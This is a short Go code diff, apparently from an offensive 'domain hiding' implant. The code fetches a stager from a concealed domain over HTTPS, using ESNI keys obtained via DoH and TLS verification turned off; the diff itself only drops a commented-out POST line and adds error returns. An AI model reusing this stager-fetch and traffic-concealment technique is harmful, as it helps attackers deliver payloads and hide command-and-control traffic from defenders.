@@ -113,7 +113,6 @@ func (s *DomainHiding) getStager()([]byte, error) {
 		log.Println(fmt.Sprintf("[+] Request url=%s", targetUrl))
 	}
 	resp, err := s.httpClient.Get("https://" + actualDomain + ":" + port + targetUrl)
-	//resp, err := httpClient.Post(("https://" + actualDomain + ":" + port + "/robots.txt"), "application/json", bytes.NewBuffer(fullMessage))
 	if err != nil {
 		fmt.Println(err.Error())
 		return nil, err
@@ -191,10 +190,12 @@ func main() {
 	esniKeysBytes, err := common.QueryESNIKeysForHostDoH("cloudflare.com", true)
 	if err != nil {
 		log.Println("[E] Failed to retrieve ESNI keys for host via DoH: %s", err)
+		return
 	}
 	esnikeys, err := dhtls.ParseESNIKeys(esniKeysBytes)
 	if err != nil {
 		log.Println("[E] Failed to parse ESNI keys: %s", err)
+		return
 	}
 	tlsConfig := &dhtls.Config{
 		InsecureSkipVerify: true,
